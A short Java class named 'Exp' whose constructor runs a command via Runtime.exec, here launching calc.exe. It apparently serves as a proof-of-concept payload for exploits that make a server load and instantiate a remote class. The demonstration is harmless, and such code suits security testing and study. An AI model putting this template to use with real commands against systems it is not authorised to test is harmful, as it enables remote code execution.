package Servlet;

public class Exp {
    public Exp(){
        try{
            // 要执行的命令
            String[] commands = {"C:\\WINDOWS\\System32\\calc.exe"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Exp e = new Exp();
    }
}